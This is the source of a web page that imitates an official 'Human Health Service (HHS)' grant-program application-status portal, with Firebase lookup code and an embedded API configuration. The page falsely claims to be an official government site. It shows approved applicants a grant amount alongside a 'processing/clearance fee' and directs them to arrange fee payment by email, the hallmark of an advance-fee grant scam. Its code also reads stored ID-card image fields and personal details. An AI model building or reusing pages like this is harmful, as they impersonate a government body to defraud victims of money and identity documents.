<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>HHS — Grant Program Application Status</title>
  <meta name="description" content="Check the status of your Human Health Service (HHS) Grant Program application using your reference and email." />
  <link rel="icon" href="logo.png" type="image/png" />
  <style>
    :root {
      --bg:#f5f7fb;
      --surface:#ffffff;
      --muted-surface:#f1f5f9;
      --border:#d0d7e2;
      --text:#0f172a;
      --muted:#475569;
      --primary:#143d6b; /* gov blue */
      --primary-2:#1d4ed8; /* accent blue */
      --success:#0f5132;
      --success-bg:#e9f7ef;
      --warning:#8a5a0a;
      --warning-bg:#fff7e6;
      --danger:#7f1d1d;
      --danger-bg:#fdecec;
      --shadow:0 10px 30px rgba(2,6,23,0.08);
    }
    html, body { margin:0; padding:0; font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color:var(--text); background:var(--bg); }
    .container { max-width: 1000px; margin: 0 auto; padding: 0 20px; }

    /* Gov masthead */
    .gov-banner { background:#0b2e58; color:#e2e8f0; font-size: 0.875rem; }
    .gov-banner .inner { display:flex; align-items:center; gap:8px; padding:6px 0; }
    .gov-banner .dot { width:10px; height:10px; border-radius:50%; background:#60a5fa; box-shadow:0 0 0 2px rgba(255,255,255,0.15) inset; }
    .gov-banner strong { color:#fff; }

    header.site-header { background: linear-gradient(180deg, #103a6a, #0b2e58); color:#fff; border-bottom:1px solid rgba(255,255,255,0.15); }
    .nav { display:flex; align-items:center; justify-content:space-between; gap:16px; padding: 16px 0; }
    .brand { display:flex; align-items:center; gap:12px; text-decoration:none; color:inherit; }
    .seal { width:48px; height:48px; border-radius:50%; background:#fff; display:grid; place-items:center; box-shadow:0 1px 2px rgba(0,0,0,0.08) inset; border:2px solid #dbeafe; }
    .seal img { width:36px; height:36px; object-fit:contain; }
    .title-wrap { line-height:1.2; }
    .title { font-weight: 900; font-size: clamp(1rem, 1.5vw + 0.8rem, 1.5rem); letter-spacing: 0.2px; }
    .subtitle { color:#dbeafe; font-size:0.92rem; }
    .nav .actions .btn { background: transparent; border:1px solid rgba(255,255,255,0.35); color:#fff; }
    .nav .actions .btn:hover { border-color:#fff; }

    /* Buttons and inputs */
    label { display:block; font-weight:800; margin: 6px 0; letter-spacing:0.2px; color:#0f172a; }
    input[type="text"], input[type="email"] { width:100%; background:#fff; border:1px solid var(--border); border-radius:10px; padding:12px; }
    input:focus { border-color: var(--primary-2); box-shadow: 0 0 0 3px rgba(37,99,235,0.15); outline: none; }
    .btn { display:inline-flex; align-items:center; gap:8px; border:0; border-radius:10px; padding:12px 16px; font-weight:800; cursor:pointer; letter-spacing:0.2px; }
    .btn.primary { background: linear-gradient(180deg,var(--primary), #0d2f57); color:#fff; box-shadow:var(--shadow); }
    .btn.ghost { background:#fff; color:var(--primary-2); border:1px solid var(--border); }
    .btn.success { background: linear-gradient(180deg,#166534,#14532d); color:#fff; }

    /* Panels */
    .panel { background:var(--surface); border:1px solid var(--border); border-radius:16px; box-shadow:var(--shadow); padding: 16px; margin: 18px 0; }
    .panel h2, .panel h3 { margin:0 0 8px 0; }
    h2 { font-size: clamp(1.1rem, 1.2vw + 0.8rem, 1.6rem); }
    h3 { font-size: clamp(1rem, 1vw + 0.7rem, 1.3rem); }
    .section h4 { font-size: clamp(0.95rem, 0.8vw + 0.7rem, 1.1rem); }
    .help { color: var(--muted); font-size: clamp(0.85rem, 0.5vw + 0.75rem, 1rem); }
    .error { color:var(--danger); background:var(--danger-bg); border:1px solid #fecaca; padding:10px; border-radius:10px; }

    /* Status header card */
    .status-card { border:1px solid var(--border); border-left:6px solid var(--border); border-radius:14px; background:var(--muted-surface); padding:12px; display:flex; justify-content:space-between; align-items:center; gap:12px; }
    .status-card.status-approved { border-left-color:#25a06a; background:#f0faf4; }
    .status-card.status-pending  { border-left-color:#e0a100; background:#fff9ea; }
    .status-card.status-rejected { border-left-color:#e24d4d; background:#fff1f1; }

    .status-badge { display:inline-flex; align-items:center; gap:8px; padding:6px 12px; border-radius:999px; font-weight:900; border:1px solid var(--border); text-transform: capitalize; letter-spacing:0.3px; }
    .status-pending { color:#92400e; background:#fffbeb; border-color:#fcd34d; }
    .status-approved { color:#065f46; background:#ecfdf5; border-color:#6ee7b7; }
    .status-rejected { color:#991b1b; background:#fee2e2; border-color:#fecaca; }

    /* Key-value grid */
    .section { margin-top:12px; }
    .section h4 { margin:0 0 6px 0; font-size:1rem; letter-spacing:0.2px; }
    .kv { display:grid; grid-template-columns: minmax(140px, 220px) 1fr; gap:10px; margin: 8px 0; align-items: start; }
    .kv > div { overflow-wrap: anywhere; word-break: break-word; }
    .kv .k { color: var(--muted); font-weight: 800; }

    /* Applicant card */
    .id-card { border:1px solid var(--border); border-radius:14px; background: linear-gradient(180deg,#ffffff,#f8fafc); padding:12px; }

    /* Award/Funding card */
    .award-card { border:1px solid var(--border); border-radius:14px; background:linear-gradient(180deg,#ffffff,#f5fbff); padding:14px; display:grid; grid-template-columns: 1fr 1fr; gap:12px; align-items:center; }
    .award-amount { font-size:clamp(1.25rem, 2vw + 0.8rem, 2rem); font-weight:900; color:#0b3b72; }
    .award-fee { font-size:1rem; font-weight:800; color:#8a5a0a; background:#fff7e6; border:1px solid #facc15; padding:8px 10px; border-radius:10px; justify-self:start; }

    /* CTA banner */
    .cta-banner { border:1px dashed #86efac; background:#f0fdf4; color:#065f46; padding:12px; border-radius:12px; display:flex; align-items:center; justify-content:space-between; gap:12px; }

    /* Images */
    .img-grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; margin-top:12px; }
    .img-wrap { background: #f8fafc; border:1px solid var(--border); border-radius: 12px; padding: 8px; display:grid; place-items:center; }
    .img-wrap img { max-width: 100%; border-radius: 8px; }

    /* Loading */
    .loading { display:flex; align-items:center; gap:12px; }
    .spinner { width:22px; height:22px; border-radius:50%; border:3px solid #cbd5e1; border-top-color:#1d4ed8; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    .skeleton { position:relative; overflow:hidden; background:#e5e7eb; border-radius:10px; }
    .skeleton::after { content:''; position:absolute; inset:0; transform: translateX(-100%); background: linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,.6), rgba(255,255,255,0)); animation: shimmer 1.2s infinite; }
    @keyframes shimmer { 100% { transform: translateX(100%); } }

    .skeleton-row { height:14px; margin:8px 0; }

    /* Layout tweaks */
    .form-grid { display:grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px; }
    .cta-row { display:flex; gap:10px; margin-top:12px; flex-wrap:wrap; }

    @media (max-width: 780px) {
      .img-grid { grid-template-columns: 1fr; }
      .kv { grid-template-columns: 1fr; }
      .form-grid { grid-template-columns: 1fr; }
      .award-card { grid-template-columns: 1fr; }
      .cta-banner { flex-direction: column; align-items: flex-start; }
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore-compat.js"></script>
</head>
<body>
  <!-- Official site banner -->
  <div class="gov-banner">
    <div class="container inner" role="status" aria-live="polite">
      <span class="dot" aria-hidden="true"></span>
      <span>This is an official <strong>Human Health Service</strong> program website.</span>
    </div>
  </div>

  <header class="site-header">
    <div class="container nav">
      <a href="index.html" class="brand" aria-label="Human Health Service home">
        <div class="seal"><img src="logo.png" alt="HHS" /></div>
        <div class="title-wrap">
          <div class="title">Human Health Service</div>
          <div class="subtitle">Grant Program — Application Status</div>
        </div>
      </a>
      <div class="actions">
        <a href="index.html" class="btn ghost">Back to portal</a>
      </div>
    </div>
  </header>

  <main class="container" style="padding: 18px 0 28px;">
    <section class="panel" aria-labelledby="find-heading">
      <h2 id="find-heading" style="margin:0 0 6px 0;">Find your application</h2>
      <p class="help">Enter your reference and the email address you used when applying. Keep this information secure.</p>
      <div class="form-grid">
        <div>
          <label for="ref">Reference</label>
          <input id="ref" type="text" placeholder="e.g., HHS-XXXXXXXX-XXXXX" autocomplete="off" />
        </div>
        <div>
          <label for="email">Email</label>
          <input id="email" type="email" placeholder="your@email.com" autocomplete="off" />
        </div>
      </div>
      <div class="cta-row">
        <button id="btnSearch" class="btn primary">Check status</button>
        <button id="btnClear" class="btn ghost">Clear</button>
      </div>
      <div id="err" class="error" style="display:none; margin-top:10px;" role="alert"></div>
    </section>

    <!-- Loading state -->
    <section id="loading" class="panel" style="display:none;">
      <div class="loading" aria-live="polite">
        <div class="spinner" aria-hidden="true"></div>
        <div>
          <div style="font-weight:800;">Retrieving your application…</div>
          <div class="help">Please wait while we securely look up your information.</div>
        </div>
      </div>
      <div style="margin-top:12px;">
        <div class="status-card skeleton" style="height:56px;"></div>
        <div class="skeleton-row skeleton" style="width:60%;"></div>
        <div class="skeleton-row skeleton" style="width:40%;"></div>
        <div class="skeleton-row skeleton" style="width:70%;"></div>
      </div>
    </section>

    <!-- Result state -->
    <section id="result" class="panel" style="display:none;" aria-live="polite">
      <div id="status-card" class="status-card">
        <div>
          <div style="font-weight:900; letter-spacing:0.2px;">Application</div>
          <div class="help">Review the current status of your submission</div>
        </div>
        <div id="badge" class="status-badge status-pending">pending</div>
      </div>

      
      <div class="section">
        <h4>Summary</h4>
        <div class="kv"><div class="k">Reference</div><div id="r-ref">-</div></div>
        <div class="kv"><div class="k">Created</div><div id="r-created">-</div></div>
      </div>

      <div class="section id-card">
        <h4>Applicant</h4>
        <div class="kv"><div class="k">Full name</div><div id="r-name">-</div></div>
        <div class="kv"><div class="k">Email</div><div id="r-email">-</div></div>
        <div class="kv"><div class="k">Phone</div><div id="r-phone">-</div></div>
      </div>

      <div class="section">
        <h4>Program details</h4>
        <div id="award-card" class="award-card" style="display:none;">
          <div>
            <div class="help" style="font-weight:800;">Approved grant amount</div>
            <div id="award-amount" class="award-amount">—</div>
          </div>
          <div>
            <div class="help" style="font-weight:800;">Processing/clearance fee</div>
            <div id="award-fee" class="award-fee">—</div>
          </div>
        </div>
        <div id="cta-banner" class="cta-banner" style="display:none; margin-top:12px;">
          <div>
            <div style="font-weight:900;">Your application is approved</div>
            <div class="help">Follow the instructions to complete claim and delivery verification.</div>
            <div class="help">For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.</div>
          </div>
          <div style="display:flex; gap:8px; flex-wrap:wrap;">
            <a id="btnClaim" class="btn success" href="#">Claim your grant</a>
            <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
          </div>
        </div>
        <div class="kv"><div class="k">Payment preference</div><div id="r-payment">-</div></div>
        <div class="kv"><div class="k">Housing status</div><div id="r-housing">-</div></div>
        <div class="kv"><div class="k">Funding</div><div id="r-funding">-</div></div>
      </div>

          </section>
  </main>

  <script>
    // Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyBdKDjmlXH8tFtF4rCvIzx11s4MgFSdFq0",
      authDomain: "kfdn-8bdeb.firebaseapp.com",
      projectId: "kfdn-8bdeb",
      storageBucket: "kfdn-8bdeb.firebasestorage.app",
      messagingSenderId: "122949220202",
      appId: "1:122949220202:web:ba7b16a5d63599452f5713",
      measurementId: "G-5BFYZ4DY0K"
    };
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    // Optional: set a program support email to populate the contact link
    const PROGRAM_SUPPORT_EMAIL = '';

    function showErr(msg) { const el = document.getElementById('err'); el.textContent = msg; el.style.display = 'block'; }
    function clearErr() { const el = document.getElementById('err'); el.textContent = ''; el.style.display = 'none'; }

    function setLoading(v) {
      document.getElementById('loading').style.display = v ? 'block' : 'none';
      document.getElementById('result').style.display = 'none';
      const btn = document.getElementById('btnSearch');
      btn.disabled = !!v;
      btn.setAttribute('aria-busy', v ? 'true' : 'false');
    }

    function setBadge(status) {
      const b = document.getElementById('badge');
      const card = document.getElementById('status-card');
      const s = (status || 'pending').toLowerCase();
      b.textContent = s;
      b.className = 'status-badge ' + (s === 'approved' ? 'status-approved' : s === 'rejected' ? 'status-rejected' : 'status-pending');
      card.className = 'status-card ' + (s === 'approved' ? 'status-approved' : s === 'rejected' ? 'status-rejected' : 'status-pending');
      // CTA handled in setCta() after data load
    }

    function fmtDate(ts) { try { return ts?.toDate ? ts.toDate().toLocaleString() : new Date(ts).toLocaleString(); } catch { return '-'; } }
    function fmtCurrency(n) {
      try { return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(n)); }
      catch { return (n!=null ? Number(n).toLocaleString() : '-') }
    }
    function firstVal(obj, keys){ for (const k of keys){ const v = obj && obj[k]; if (typeof v === 'string' && v.trim()) return v.trim(); } return ''; }
    function getImageUrl(d, which){
      const frontKeys = ['cloudinaryUrlFront','frontUrl','idFrontUrl','idFront','frontImage','imageFront','idFrontImage'];
      const backKeys  = ['cloudinaryUrlBack','backUrl','idBackUrl','idBack','backImage','imageBack','idBackImage'];
      return firstVal(d, which === 'front' ? frontKeys : backKeys);
    }
    function setCta(status, d, a, docId, f){
      const cta = document.getElementById('cta-banner');
      if (!cta) return;
      const s = (status || 'pending').toLowerCase();
      let heading = '', sub1 = '', sub2 = '';
      let showClaim = false;
      if (s === 'approved') {
        heading = 'Your application is approved';
        sub1 = 'Follow the instructions to complete claim and delivery verification.';
        sub2 = 'For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.';
        showClaim = true;
      } else if (s === 'pending') {
        heading = 'Your application is under review';
        sub1 = 'We will contact you by email when a decision is available.';
        sub2 = 'If you have questions, reply to your submission email or contact support.';
      } else {
        heading = 'Application not approved at this time';
        sub1 = 'If you believe this is in error, contact support with your reference.';
        sub2 = '';
      }
      cta.innerHTML = `
        <div>
          <div style="font-weight:900;">${heading}</div>
          <div class="help">${sub1}</div>
          ${sub2 ? `<div class="help">${sub2}</div>` : ''}
        </div>
        <div style="display:flex; gap:8px; flex-wrap:wrap;">
          <a id="btnClaim" class="btn success" href="#" style="${showClaim ? '' : 'display:none;'}">Claim your grant</a>
          <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
        </div>`;
      cta.style.display = 'flex';
      const btnClaim = cta.querySelector('#btnClaim');
      if (btnClaim) {
        const subject = encodeURIComponent(`HHS Grant Claim — Reference ${d.reference || docId}`);
        const lines = [
          `Reference: ${d.reference || docId}`,
          `Applicant: ${a.fullName || '-'}`,
          f && f.amount != null ? `Approved amount: ${fmtCurrency(f.amount)}` : null,
          f && f.fee != null ? `Processing/Clearance fee: ${fmtCurrency(f.fee)}` : null,
          '',
          'I would like to proceed with claiming my grant. Please provide the next steps for verification and delivery.'
        ].filter(Boolean);
        const body = encodeURIComponent(lines.join('\n'));
        btnClaim.href = `mailto:?subject=${subject}&body=${body}`;
      }
      const btnSupport = cta.querySelector('#btnSupport');
      if (btnSupport) {
        const supportEmail = typeof PROGRAM_SUPPORT_EMAIL === 'string' && PROGRAM_SUPPORT_EMAIL.trim() ? PROGRAM_SUPPORT_EMAIL.trim() : '';
        const supportTo = supportEmail ? encodeURIComponent(supportEmail) : '';
        const supportSubject = encodeURIComponent(`HHS Grant Support — Reference ${d.reference || docId}`);
        btnSupport.href = `mailto:${supportTo}?subject=${supportSubject}`;
      }
    }

    async function search() {
      clearErr();
      const ref = document.getElementById('ref').value.trim();
      const email = document.getElementById('email').value.trim().toLowerCase();
      if (!ref || !email) { showErr('Please enter both reference and email.'); return; }
      try {
        setLoading(true);
        const q = await db.collection('applications').where('reference','==', ref).limit(1).get();
        let docSnap = null;
        if (q.empty) {
          // Fallback: try direct document ID lookup
          const byId = await db.collection('applications').doc(ref).get();
          if (byId.exists) {
            docSnap = byId;
          } else {
            setLoading(false); showErr('No application found for that reference.'); return;
          }
        } else {
          docSnap = q.docs[0];
        }
        const d = docSnap.data();
        const a = d.applicant || {};
        if ((a.email || '').toLowerCase() !== email) { setLoading(false); showErr('Email does not match this reference.'); return; }
        // Render
        setLoading(false);
        document.getElementById('result').style.display = 'block';
        setBadge(d.status);
        document.getElementById('r-ref').textContent = d.reference || docSnap.id;
        document.getElementById('r-created').textContent = fmtDate(d.createdAt);
        document.getElementById('r-name').textContent = a.fullName || '-';
        document.getElementById('r-email').textContent = a.email || '-';
        document.getElementById('r-phone').textContent = a.phone || '-';
        document.getElementById('r-payment').textContent = a.paymentPreference || '-';
        document.getElementById('r-housing').textContent = a.housingStatus || '-';
        const f = d.funding || {};
        const fundingText = f.label || [
          f.amount != null ? `Amount: ${Number(f.amount).toLocaleString()}` : null,
          f.fee != null ? `Fee: ${Number(f.fee).toLocaleString()}` : null
        ].filter(Boolean).join(' • ');
        document.getElementById('r-funding').textContent = fundingText || '-';

        // Award/Fee card
        const awardCard = document.getElementById('award-card');
        const hasAward = (f && (f.amount != null || f.fee != null));
        if (hasAward) {
          document.getElementById('award-amount').textContent = f.amount != null ? fmtCurrency(f.amount) : '—';
          document.getElementById('award-fee').textContent = f.fee != null ? `${fmtCurrency(f.fee)} processing` : '—';
          awardCard.style.display = 'grid';
        } else {
          awardCard.style.display = 'none';
        }

        
        // CTA
        setCta(d.status, d, a, docSnap.id, f);
      } catch (e) {
        setLoading(false);
        showErr('Failed to look up application: ' + e.message);
      }
    }

    document.getElementById('btnSearch').addEventListener('click', search);
    document.getElementById('btnClear').addEventListener('click', () => {
      document.getElementById('ref').value='';
      document.getElementById('email').value='';
      document.getElementById('result').style.display='none';
      document.getElementById('loading').style.display='none';
      clearErr();
    });

    // Autofill from query params and auto-search when both provided
    (function initFromQuery(){
      try {
        const params = new URLSearchParams(window.location.search);
        const qRef = params.get('ref');
        const qEmail = params.get('email');
        if (qRef) document.getElementById('ref').value = qRef;
        if (qEmail) document.getElementById('email').value = qEmail;
        if (qRef && qEmail) search();
      } catch(_) {}
    })();
  </script>
</body>
</html>